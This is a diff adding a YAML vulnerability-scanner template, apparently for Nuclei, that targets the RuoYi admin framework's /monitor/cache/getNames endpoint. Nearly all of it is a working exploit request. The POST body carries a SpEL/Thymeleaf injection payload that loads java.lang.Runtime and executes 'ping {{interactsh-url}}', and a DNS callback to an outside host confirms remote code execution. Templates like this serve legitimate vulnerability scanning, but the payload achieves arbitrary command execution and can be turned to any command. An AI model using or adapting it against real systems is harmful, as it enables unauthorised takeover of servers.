@@ -1,0 +1,39 @@
+id: ruoyi-getNames-rce
+
+info:
+  name: ruoyi-getNames-rce
+  author: ro1t
+  severity: high
+  metadata:
+    fofa-qeury: app=""
+  tags: ruoyi
+
+http:
+  - raw:
+      - |
+        GET /ruoyi/js/ry-ui.js?v=4.8.1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
+        Content-Length: 2
+      - |
+        POST /monitor/cache/getNames HTTP/1.1
+        Host: {{Hostname}}
+        sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null).getClass.getMethods.?[name=='exec'][0].invoke(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null),'ping {{interactsh-url}}',null))}|__::.x
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: dsl
+        dsl:
+          - 'contains(body_1,"sortName")'
+          - 'contains(body_1,"pageNumber")'
+        condition: and
